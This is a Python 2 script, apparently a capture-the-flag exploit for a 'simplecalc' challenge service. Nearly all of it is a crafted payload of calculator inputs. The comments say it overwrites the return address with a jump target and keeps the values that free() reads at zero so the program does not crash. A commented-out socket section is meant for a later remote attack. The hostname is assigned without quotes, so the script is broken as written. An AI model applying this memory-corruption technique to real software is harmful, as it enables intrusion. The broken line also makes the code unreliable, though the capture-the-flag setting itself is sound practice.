#! /usr/bin/env python


##########################################
#
#	Current Usage:
#		python bkp_simple_calc.py | ./b28b103ea5f1171553554f0127696a18c6d2dcf7
#
##########################################

import socket

# Setting up for remote exploit in future
host = simplecalc.bostonkey.party
port = 5400

ret = '''254
2
100
99

2
100
98

2
100
97

2
100
96

2
100
95

2
100
94

2
100
93

2
100
92

2
100
91

2
100
90

2
100
89

2
100
88

2
100
100

2
100
100

2
100
85

2
100
84

2
100
83

2
100
82

2
7097060
100

2
100
100
''' # The second last val is 7097060-100 = address to jump to
# The last 2 vals are the return address (block 19 & 20)
# block 13 and 14 need to be 0 and 0 to not crash free

print ret

# Later to do remote sploiting
#client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#client.connect((host,port))
#client.send(ret)